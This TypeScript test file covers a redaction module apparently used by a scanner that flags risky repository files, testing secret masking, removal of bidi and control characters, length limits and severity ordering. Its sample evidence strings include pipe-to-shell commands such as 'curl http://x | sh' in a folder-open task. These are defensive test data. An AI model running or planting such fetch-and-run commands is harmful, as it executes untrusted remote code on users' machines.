import { describe, expect, test } from 'vitest';
import fc from 'fast-check';
import { redact, redactAll } from '../../src/verdict/redact';
import type { Finding, Severity } from '../../src/engine/types';
import { f } from '../engine/helpers';

const KEY = 'b2'.repeat(32);
const ch = (...codes: number[]) => String.fromCharCode(...codes);
const BIDI = ch(0x202e, 0x2066, 0x2069);
const CONTROL = ch(0x00, 0x07, 0x1b, 0x7f, 0x85);
const ZERO_WIDTH = ch(0x200b, 0xfeff);
const withEvidence = (evidence: string, extra: Partial<Finding> = {}): Finding => ({ ...f('high'), evidence, ...extra });
const abandon = (n: number, last: string) => [...Array<string>(n - 1).fill('abandon'), last].join(' ');

describe('redact: secrets embedded in any string', () => {
  test('a key embedded in a tasks.json evidence string is masked', () => {
    const out = redact(withEvidence(`.vscode/tasks.json:14 env PRIVATE_KEY=0x${KEY} then curl http://x | sh`));
    expect(out.evidence).not.toContain(KEY);
    expect(out.evidence).toContain('curl http://x | sh');
  });
  test('in the title too', () => expect(redact(withEvidence('e', { title: `leaks 0x${KEY}` })).title).not.toContain(KEY));
  test.each([
    ['a mnemonic', abandon(12, 'about'), /abandon/],
    ['a PEM block', '-----BEGIN RSA PRIVATE KEY-----\nMIIEvQIBADANBg\n-----END RSA PRIVATE KEY-----', /MIIEvQ/],
    ['a Solana keypair', `[${Array.from({ length: 64 }, (_, i) => i).join(',')}]`, /\d+,\d+,\d+/],
    ['a GitHub token', `ghp_${'A1b2'.repeat(10)}`, /ghp_A1b2/],
    ['an AWS key id', 'AKIAIOSFODNN7EXAMPLE', /AKIAIOSFODNN7/],
    ['a Slack token', 'xoxb-1234567890-abcdefghij', /xoxb-1234/],
    ['an API key', 'sk-ant-api03-abcdefghijklmnopqrstuvwx', /sk-ant-api03/],
    ['a JWT', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r', /eyJhbGci/],
    ['a Telegram bot token', 'bot1234567890:AAH_abcdefghijklmnopqrstuvwxyz0123456', /AAH_abc/],
    ['a bearer token', 'Authorization: Bearer abcdef0123456789abcdef0123', /abcdef0123456789/],
  ])('%s is removed', (_n, secret, leak) => {
    const out = redact(withEvidence(`before ${secret} after`));
    expect(out.evidence).not.toMatch(leak);
    expect(out.evidence).toContain('before');
    expect(out.evidence).toContain('after');
  });
  test('an unterminated PEM block fails closed: everything after the header is dropped', () => {
    const out = redact(withEvidence('before -----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg and more'));
    expect(out.evidence).toBe('before [private key redacted]');
  });
  test('the masked form a rule produced is left as it is', () => expect(redact(withEvidence('Private key 0xb2…2b2')).evidence).toBe('Private key 0xb2…2b2'));
  test('ordinary evidence is untouched', () => {
    const e = '.vscode/tasks.json:14 runOn: folderOpen → curl http://127.0.0.1:9/never/setup.sh | sh';
    expect(redact(withEvidence(e)).evidence).toBe(e);
  });
  test('property: no 64-hex run survives anywhere in title or evidence', () => {
    fc.assert(
      fc.property(fc.stringMatching(/^[0-9a-fA-F]{64}$/), fc.string({ maxLength: 40 }), fc.string({ maxLength: 40 }), fc.boolean(), (hex, pre, post, prefix) => {
        const secret = (prefix ? '0x' : '') + hex;
        const out = redact(withEvidence(`${pre}${secret}${post}`, { title: `${pre}${secret}` }));
        expect(out.evidence.toLowerCase()).not.toContain(hex.toLowerCase());
        expect(out.title.toLowerCase()).not.toContain(hex.toLowerCase());
      }),
      { numRuns: 300 },
    );
  });
});

describe('redact: text hygiene', () => {
  test('control, bidi and zero-width characters are removed from title, evidence and file', () => {
    const dirty = `a${BIDI}b${CONTROL}c${ZERO_WIDTH}d`;
    const out = redact(withEvidence(dirty, { title: dirty, location: { file: `src/${dirty}.ts`, line: 3 } }));
    expect(out.evidence).toBe('abcd');
    expect(out.title).toBe('abcd');
    expect(out.location).toEqual({ file: 'src/abcd.ts', line: 3 });
  });
  test('evidence is truncated to 300 characters', () => {
    const out = redact(withEvidence('x'.repeat(5000)));
    expect(out.evidence.length).toBeLessThanOrEqual(300);
    expect(out.evidence.startsWith('xxxx')).toBe(true);
  });
  test('title is bounded too', () => expect(redact(withEvidence('e', { title: 't'.repeat(5000) })).title.length).toBeLessThanOrEqual(200));
  test('newlines collapse to single spaces', () => expect(redact(withEvidence('a\n\n  b\tc')).evidence).toBe('a b c'));
  test('a secret split by truncation cannot leave a partial key: masking runs before truncation', () => {
    const out = redact(withEvidence(`${'y'.repeat(280)} 0x${KEY}`));
    expect(out.evidence).not.toMatch(/[0-9a-f]{20,}/i);
  });
});

describe('redact: contract', () => {
  test('keeps the finding fields it must not change, and does not mutate its input', () => {
    const input = withEvidence('e', { ruleId: 'tasks.folder-open', location: { file: '.vscode/tasks.json', line: 14 } });
    const before = JSON.stringify(input);
    const out = redact(input);
    expect(out).toMatchObject({ ruleId: 'tasks.folder-open', layer: 'repo-file', severity: 'high', source: 'rules', checkedAt: input.checkedAt, location: { file: '.vscode/tasks.json', line: 14 } });
    expect(JSON.stringify(input)).toBe(before);
  });
  test('adds no runtime field: the brand is type-only, so request bodies stay clean', () => {
    expect(Object.keys(redact(f('high'))).sort()).toEqual(Object.keys(f('high')).sort());
  });
});

describe('redact: bounded work on hostile input', () => {
  const hostile: [string, string][] = [
    ['many PEM headers', '-----BEGIN PRIVATE KEY-----'.repeat(2000)],
    ['a long word run', 'abandon '.repeat(20000)],
    ['a long hex run', 'a'.repeat(1_000_000)],
    ['digits and commas', '[1,'.repeat(20000)],
    ['spaces', ' '.repeat(1_000_000)],
    ['near-miss tokens', 'ghp_'.repeat(20000) + 'sk-'.repeat(20000)],
  ];
  test.each(hostile)('%s', (_n, text) => {
    const t = Date.now();
    redact(withEvidence(text, { title: text }));
    expect(Date.now() - t).toBeLessThan(1500);
  });
});

describe('redactAll', () => {
  const sev: Severity[] = ['caution', 'high', 'critical'];
  const many = (n: number) => Array.from({ length: n }, (_, i) => f(sev[i % 3]!, `r${i}`));
  test('caps at 20', () => expect(redactAll(many(55))).toHaveLength(20));
  test('critical first, then high, then caution', () => {
    const out = redactAll(many(30)).map((x) => x.severity);
    expect(out).toEqual([...out].sort((a, b) => sev.indexOf(b) - sev.indexOf(a)));
    expect(out[0]).toBe('critical');
  });
  test('a lone critical beyond the cap still makes the cut', () => {
    const list = [...Array.from({ length: 40 }, (_, i) => f('caution', `c${i}`)), f('critical', 'the-one')];
    expect(redactAll(list).map((x) => x.ruleId)).toContain('the-one');
  });
  test('stable within a severity, and every item is redacted', () => {
    const out = redactAll([withEvidence(`k 0x${KEY}`, { ruleId: 'a' }), withEvidence('x', { ruleId: 'b' })]);
    expect(out.map((x) => x.ruleId)).toEqual(['a', 'b']);
    expect(JSON.stringify(out)).not.toContain(KEY);
  });
  test('fewer than 20 are all returned; empty is empty', () => {
    expect(redactAll(many(3))).toHaveLength(3);
    expect(redactAll([])).toEqual([]);
  });
});
